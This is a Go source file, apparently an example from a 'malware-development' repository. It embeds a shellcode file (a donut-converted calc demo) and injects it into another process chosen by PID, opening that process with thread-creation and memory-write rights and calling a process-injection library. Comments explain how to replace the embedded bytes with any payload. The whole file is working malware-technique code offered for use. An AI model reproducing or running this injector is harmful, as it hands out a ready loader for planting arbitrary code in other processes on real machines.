package main

import (
	_ "embed"
	"fmt"
	processInjection "github.com/osonkr/malware-development/process-injection"
	"github.com/osonkr/malware-development/win32"
	"log"
	"os"
	"strconv"
)

// For this embed to work, change calc.bin to a file containing your bytes or
// go to malware-development/examples/calc and compile calc.go
//     go build -buildmode=pie -o calc.exe .
// then use TheWover/donut to generate the calc.bin file

//go:embed protected/calc.bin
var shellcode []byte

func main() {
	if len(os.Args) < 2 {
		fmt.Printf("Usage: %s <pid>\n", os.Args[0])
		os.Exit(1)
	}

	pid, err := strconv.ParseUint(os.Args[1], 10, 32)
	if err != nil {
		log.Fatal(err)
	}

	var rights uint32 = win32.PROCESS_CREATE_THREAD |
		win32.PROCESS_QUERY_INFORMATION |
		win32.PROCESS_VM_OPERATION |
		win32.PROCESS_VM_WRITE |
		win32.PROCESS_VM_READ

	procHandle, err := win32.OpenProcess(rights, 0, win32.DWORD(pid))
	if err != nil {
		log.Fatalf("couldn't open process: %s", err)
	}

	processInjection.Inject(shellcode, procHandle)
}
